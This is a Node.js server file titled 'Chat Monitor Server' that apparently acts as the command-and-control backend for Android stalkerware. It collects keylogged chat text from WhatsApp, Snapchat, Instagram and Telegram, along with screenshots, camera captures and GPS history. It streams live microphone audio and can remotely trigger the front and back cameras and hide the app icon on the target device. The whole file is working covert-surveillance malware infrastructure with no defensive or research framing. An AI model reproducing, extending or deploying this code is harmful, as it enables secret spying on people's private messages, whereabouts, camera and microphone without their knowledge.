const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    transports: ['websocket', 'polling'],
    allowEIO3: true
});

const port = 8080;
const uploadsDir = path.join(__dirname, './uploads');

// Create uploads directory
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const typeDir = path.join(uploadsDir, req.body.type || 'captures');
        if (!fs.existsSync(typeDir)) {
            fs.mkdirSync(typeDir, { recursive: true });
        }
        cb(null, typeDir);
    },
    filename: (req, file, cb) => {
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        const name = `${req.body.type}_${timestamp}${ext}`;
        cb(null, name);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 }
});

// Middleware
app.use(express.json());
app.use(express.static(__dirname));
app.use('/uploads', express.static(path.join(__dirname, './uploads')));

// Storage
let chats = {};
let captures = [];
let locations = []; // Store location history
let liveKeyloggingEnabled = true;
let connectedDevices = new Map();

// ========== REST API ==========

// Keylog endpoint
app.post('/keylog', (req, res) => {
    try {
        const data = req.body;
        data.server_time = new Date().toISOString();
        data.type = data.type || 'sent';
        
        if (liveKeyloggingEnabled) {
            const appName = getAppDisplayName(data.package);
            const chatName = data.chatName || 'Unknown';
            const chatKey = `${data.package}:${chatName}`;
            
            if (!chats[chatKey]) {
                chats[chatKey] = {
                    app: appName,
                    package: data.package,
                    person: chatName,
                    messages: [],
                    created: new Date().toISOString()
                };
            }
            
            chats[chatKey].messages.push({
                text: data.text,
                type: data.type,
                timestamp: data.timestamp,
                server_time: data.server_time,
                viewId: data.viewId,
                hint: data.hint
            });
            
            console.log(`\n✉️ MESSAGE (${data.type.toUpperCase()}):`);
            console.log(`   📱 App: ${appName}`);
            console.log(`   👤 Person: ${chatName}`);
            console.log(`   📝 Text: ${data.text}`);
            
            io.emit('new-message', { chatKey, chat: chats[chatKey] });
        }
        
        res.json({ status: 'success' });
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        uploads: captures.length
    });
});

// Upload capture
app.post('/upload-capture', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ status: 'error', message: 'No file provided' });
        }

        const captureData = {
            id: `${req.body.type}_${Date.now()}`,
            type: req.body.type || 'unknown',
            filename: req.file.filename,
            filepath: req.file.path,
            size: req.file.size,
            uploadTime: new Date().toISOString(),
            timestamp: req.body.timestamp || new Date().toISOString(),
            deviceId: req.body.deviceId || 'unknown',
            url: `/uploads/${req.body.type}/${req.file.filename}`
        };

        captures.push(captureData);

        console.log(`\n✅ CAPTURE RECEIVED:`);
        console.log(`   📱 Type: ${captureData.type}`);
        console.log(`   💾 File: ${req.file.filename}`);
        console.log(`   📊 Size: ${(req.file.size / 1024).toFixed(2)} KB`);

        io.emit('new-capture', captureData);

        res.json({ status: 'success', capture: captureData });
    } catch (error) {
        console.error('❌ Upload Error:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Get chats
app.get('/api/chats', (req, res) => {
    res.json({ status: 'success', chats });
});

app.get('/api/chats/:app', (req, res) => {
    const { app } = req.params;
    const appChats = Object.entries(chats)
        .filter(([_, value]) => value.package === app || value.app.toLowerCase() === app.toLowerCase())
        .reduce((acc, [key, value]) => { acc[key] = value; return acc; }, {});
    res.json({ status: 'success', chats: appChats });
});

app.get('/api/chat/:chatKey', (req, res) => {
    const chat = chats[decodeURIComponent(req.params.chatKey)];
    if (chat) {
        res.json({ status: 'success', chat });
    } else {
        res.status(404).json({ status: 'error', message: 'Chat not found' });
    }
});

app.post('/api/clear', (req, res) => {
    chats = {};
    res.json({ status: 'success', message: 'Chats cleared' });
});

// Server status
app.get('/api/status', (req, res) => {
    res.json({
        status: 'running',
        chats_count: Object.keys(chats).length,
        messages_count: Object.values(chats).reduce((sum, chat) => sum + chat.messages.length, 0),
        captures_count: captures.length,
        live_keylogging: liveKeyloggingEnabled,
        connected_devices: connectedDevices.size,
        server_time: new Date().toISOString()
    });
});

// Toggle live keylogging
app.post('/api/toggle-live', (req, res) => {
    try {
        liveKeyloggingEnabled = req.body.enabled === true;
        console.log(`🔄 Live keylogging ${liveKeyloggingEnabled ? 'ENABLED' : 'DISABLED'}`);
        io.emit('live-keylogging-status', { enabled: liveKeyloggingEnabled });
        res.json({ status: 'success', enabled: liveKeyloggingEnabled });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Get captures
app.get('/api/captures', (req, res) => {
    res.json({ status: 'success', captures });
});

app.get('/api/captures/:type', (req, res) => {
    const filtered = captures.filter(c => c.type === req.params.type);
    res.json({ status: 'success', captures: filtered });
});

app.get('/api/captures/view/:id', (req, res) => {
    const capture = captures.find(c => c.id === req.params.id);
    capture 
        ? res.json({ status: 'success', capture })
        : res.status(404).json({ status: 'error', message: 'Capture not found' });
});

app.post('/api/captures/clear', (req, res) => {
    captures = [];
    res.json({ status: 'success', message: 'Captures cleared' });
});

// Location API endpoints
app.get('/api/locations', (req, res) => {
    res.json({ locations });
});

app.post('/api/locations/clear', (req, res) => {
    locations = [];
    res.json({ status: 'success', message: 'Locations cleared' });
});

// Location endpoint
app.post('/location', (req, res) => {
    const { latitude, longitude, accuracy, altitude, provider, timestamp } = req.body;
    
    const locationData = {
        id: Date.now(),
        latitude, 
        longitude, 
        accuracy, 
        altitude, 
        provider, 
        timestamp,
        server_time: new Date().toISOString()
    };
    
    // Store location in history
    locations.push(locationData);
    
    // Keep only last 100 locations to avoid memory overflow
    if (locations.length > 100) {
        locations.shift();
    }
    
    console.log(`\n📍 LOCATION RECEIVED:`);
    console.log(`   🎯 Coordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`);
    console.log(`   📏 Accuracy: ${accuracy}m`);
    console.log(`   📡 Provider: ${provider}`);
    console.log(`   🕐 Time: ${timestamp}`);
    
    io.emit('location-data', locationData);
    res.json({ success: true });
});

// Helper function
function getAppDisplayName(packageName) {
    const map = {
        'com.whatsapp': 'WhatsApp',
        'com.snapchat.android': 'Snapchat',
        'com.instagram.android': 'Instagram',
        'com.telegram': 'Telegram',
        'org.telegram.messenger': 'Telegram'
    };
    return map[packageName] || packageName;
}

// Helper function to broadcast device list
function broadcastDeviceListUpdate() {
    try {
        const devicesList = Array.from(connectedDevices.values()).map(d => ({
            id: d.id, ip: d.ip, deviceName: d.deviceName, connectedAt: d.connectedAt
        }));
        console.log(`📤 Broadcasting device list to all clients: ${devicesList.length} devices`);
        io.emit('device-list-update', { devices: devicesList });
    } catch (error) {
        console.error(`❌ Error in broadcastDeviceListUpdate: ${error.message}`, error);
    }
}

// ========== SOCKET.IO ==========

io.on('connection', (socket) => {
    const deviceId = socket.id;
    const clientIP = socket.handshake.address || 'Unknown';
    const userAgent = socket.handshake.headers['user-agent'] || '';
    const isBrowser = ['Mozilla', 'Chrome', 'Safari', 'Firefox', 'Edge', 'Opera'].some(ua => userAgent.includes(ua));
    
    console.log(`\n🔌 Connection: ${deviceId.substring(0, 12)} (${isBrowser ? '🌐 Browser' : '📱 Device'})`);
    
    if (isBrowser) {
        // Browser dashboard
        console.log(`🌐 Browser connected, sending current device list`);
        broadcastDeviceListUpdate();
        
        socket.on('request-device-list', () => {
            console.log(`📤 Browser requested device list, sending ${connectedDevices.size} devices`);
            broadcastDeviceListUpdate();
        });
    } else {
        // Android device
        const deviceRecord = {
            id: deviceId, 
            ip: clientIP, 
            connectedAt: new Date().toISOString(), 
            socket, 
            deviceName: `Device ${deviceId.substring(0, 8)}`
        };
        connectedDevices.set(deviceId, deviceRecord);
        
        console.log(`📱 Device connected! Total: ${connectedDevices.size}`);
        console.log(`   Device ID: ${deviceId}`);
        console.log(`   IP: ${clientIP}`);
        
        socket.emit('live-keylogging-status', { enabled: liveKeyloggingEnabled });
        
        // Broadcast device list immediately
        broadcastDeviceListUpdate();
        
        socket.on('device-info', (info) => {
            try {
                const device = connectedDevices.get(deviceId);
                if (device) {
                    device.deviceName = info.deviceName || `Device ${deviceId.substring(0, 8)}`;
                    console.log(`📱 Device info updated: ${device.deviceName}`);
                    broadcastDeviceListUpdate();
                }
            } catch (error) {
                console.error(`❌ Error handling device-info: ${error.message}`, error);
            }
        });
        
        // Error handler
        socket.on('error', (error) => {
            console.error(`❌ Socket error from device ${deviceId}:`, error);
        });
    }
    
    socket.on('disconnect', () => {
        if (connectedDevices.has(deviceId)) {
            const device = connectedDevices.get(deviceId);
            connectedDevices.delete(deviceId);
            console.log(`\n📱 Device disconnected: ${device.deviceName} (Total: ${connectedDevices.size})`);
            
            broadcastDeviceListUpdate();
        }
    });
    
    socket.on('toggle-live-keylogging', (data) => {
        liveKeyloggingEnabled = (data && typeof data.enabled === 'boolean') ? data.enabled : !liveKeyloggingEnabled;
        console.log(`🔄 Live keylogging ${liveKeyloggingEnabled ? 'ENABLED' : 'DISABLED'}`);
        io.emit('live-keylogging-status', { enabled: liveKeyloggingEnabled });
    });

    // Commands - Screenshot
    socket.on('send-screenshot-cmd', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`📸 Screenshot command to ${data.deviceId}`);
            targetDevice.socket.emit('request-screenshot', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'screenshot', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Front camera
    socket.on('send-front-cam-cmd', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`🤳 Front camera command to ${data.deviceId}`);
            targetDevice.socket.emit('request-front-cam', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'front_cam', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Back camera
    socket.on('send-back-cam-cmd', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`📷 Back camera command to ${data.deviceId}`);
            targetDevice.socket.emit('request-back-cam', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'back_cam', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Audio
    socket.on('send-audio-cmd', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`🎤 Audio command to ${data.deviceId}`);
            targetDevice.socket.emit('request-audio', { duration: data.duration || 10000, timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'audio', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Stop audio
    socket.on('send-stop-audio-cmd', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`⏹️ Stop audio to ${data.deviceId}`);
            targetDevice.socket.emit('request-stop-audio', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'stop_audio', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Location
    socket.on('send-location-request', (data) => {
        const targetDevice = connectedDevices.get(data.deviceId);
        if (targetDevice?.socket) {
            console.log(`📍 Location request to ${data.deviceId}`);
            targetDevice.socket.emit('request-location', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'location', device: data.deviceId });
        } else {
            socket.emit('command-error', { message: 'Device not found', device: data.deviceId });
        }
    });

    // Commands - Hide app
    socket.on('send-hide-app-cmd', (data) => {
        let targetDevice = connectedDevices.get(data.targetDevice || data.deviceId);
        if (!targetDevice) {
            for (let [id, device] of connectedDevices) {
                if (!device.isBrowser) {
                    targetDevice = device;
                    break;
                }
            }
        }
        if (targetDevice?.socket) {
            console.log(`👻 Hide app to ${targetDevice.id}`);
            targetDevice.socket.emit('send-hide-app-cmd', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'hide_app', device: targetDevice.id });
        } else {
            socket.emit('command-error', { message: 'Device not found' });
        }
    });

    // Commands - Show app
    socket.on('send-show-app-cmd', (data) => {
        let targetDevice = connectedDevices.get(data.targetDevice || data.deviceId);
        if (!targetDevice) {
            for (let [id, device] of connectedDevices) {
                if (!device.isBrowser) {
                    targetDevice = device;
                    break;
                }
            }
        }
        if (targetDevice?.socket) {
            console.log(`📱 Show app to ${targetDevice.id}`);
            targetDevice.socket.emit('send-show-app-cmd', { timestamp: Date.now() });
            socket.emit('command-sent', { success: true, command: 'show_app', device: targetDevice.id });
        } else {
            socket.emit('command-error', { message: 'Device not found' });
        }
    });

    // Audio streaming
    socket.on('audio-stream-start', (data) => {
        console.log(`🎤 Audio streaming started (${data.sessionId})`);
        io.emit('audio-stream-start', { ...data, deviceId, timestamp: Date.now() });
    });

    socket.on('audio-chunk', (data) => {
        io.emit('audio-chunk', { ...data, deviceId, timestamp: data.timestamp || Date.now() });
    });

    socket.on('audio-stream-end', (data) => {
        console.log(`🎤 Audio stream ended (${data.sessionId})`);
        io.emit('audio-stream-end', { ...data, deviceId, timestamp: Date.now() });
    });

    socket.on('audio-error', (data) => {
        console.error(`❌ Audio error: ${data.error}`);
        io.emit('audio-error', { ...data, deviceId, timestamp: Date.now() });
    });

    // Location data
    socket.on('location', (data) => {
        const device = connectedDevices.get(deviceId);
        const deviceName = device ? device.deviceName : 'Unknown Device';
        
        const locationData = {
            id: Date.now(),
            latitude: data.latitude,
            longitude: data.longitude,
            accuracy: data.accuracy,
            altitude: data.altitude,
            provider: data.provider,
            timestamp: data.timestamp,
            deviceId,
            deviceName,
            receivedAt: new Date().toISOString()
        };
        
        // Store location in history
        locations.push(locationData);
        
        // Keep only last 100 locations
        if (locations.length > 100) {
            locations.shift();
        }
        
        console.log(`\n📍 LOCATION (WebSocket):`);
        console.log(`   📱 Device: ${deviceName}`);
        console.log(`   🎯 Coordinates: ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}`);
        console.log(`   📏 Accuracy: ${data.accuracy}m`);
        console.log(`   📡 Provider: ${data.provider}`);
        console.log(`   🕐 Device Time: ${data.timestamp}`);
        console.log(`   ⏰ Server Time: ${locationData.receivedAt}`);
        
        io.emit('location-data', locationData);
    });

    // Debug UI dump
    socket.on('debug-dump-enable', (data) => {
        console.log(`🐛 Debug dump enable`);
        const targetDevice = data?.targetDevice;
        if (targetDevice && connectedDevices.has(targetDevice)) {
            io.to(targetDevice).emit('debug_dump_enable');
        } else {
            io.emit('debug_dump_enable');
        }
    });
    
    socket.on('debug-dump-disable', (data) => {
        console.log(`🐛 Debug dump disable`);
        const targetDevice = data?.targetDevice;
        if (targetDevice && connectedDevices.has(targetDevice)) {
            io.to(targetDevice).emit('debug_dump_disable');
        } else {
            io.emit('debug_dump_disable');
        }
    });
    
    socket.on('debug-status', (data) => {
        console.log(`🐛 Debug status: ${data.feature} - ${data.debugMode ? 'ON' : 'OFF'}`);
        io.emit('debug-status-update', { ...data, deviceId, timestamp: Date.now() });
    });
});

// Home page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'main.html'));
});

// Start server
server.listen(port, () => {
    console.log('🚀 Chat Monitor Server Running');
    console.log(`✅ Server at http://localhost:${port}`);
    console.log('📱 Waiting for device connections...');
});
